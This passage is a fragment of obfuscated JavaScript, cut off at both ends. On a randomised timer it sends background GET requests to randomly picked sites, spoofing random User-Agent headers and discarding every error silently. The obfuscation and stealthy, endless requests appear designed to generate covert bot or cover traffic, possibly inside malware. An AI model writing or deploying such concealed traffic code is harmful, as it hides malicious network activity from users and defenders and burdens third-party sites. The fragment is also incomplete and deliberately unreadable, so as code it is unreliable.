      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x258 * -0x13 + 0x12ed + -0x1 * -0x34f3) * getRandomInt(-0xf89 + -0x55e * -0x1 + 0xa2c, -0x35 * 0x59 + 0x71 * -0x1 + 0x12e3));
}, -0x8 * -0x4df + -0x1172 + -0x1522);